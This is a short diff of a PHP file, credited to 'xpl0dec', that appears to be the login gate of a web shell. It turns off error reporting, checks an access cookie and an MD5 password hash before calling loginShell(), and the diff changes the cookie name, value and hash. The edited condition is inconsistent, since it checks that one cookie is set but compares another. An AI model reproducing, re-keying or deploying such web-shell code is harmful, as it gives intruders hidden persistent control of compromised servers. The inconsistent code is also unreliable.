@@ -3,10 +3,10 @@
 //Author by xpl0dec - Bhinneka Tech
 error_reporting(0);
 
-if (isset($_COOKIE['cicak']) && $_COOKIE['cicak'] === 'xxcodecicak') {
+if (isset($_COOKIE['cicak']) && $_COOKIE['cus'] === 'capcus7') {
 } else {
-    if (isset($_POST['login']) && md5($_POST['password']) === 'be6bd4bd1cb282a4847d6540162c7207') {
-        setcookie('cicak', 'xxcodecicak', time() + 3600, '/');
+    if (isset($_POST['login']) && md5($_POST['password']) === 'a2bf01e7bc417f98e2f022b89b5a2737') {
+        setcookie('cus', 'capcus7', time() + 3600, '/');
     } else {
         loginShell();
     }
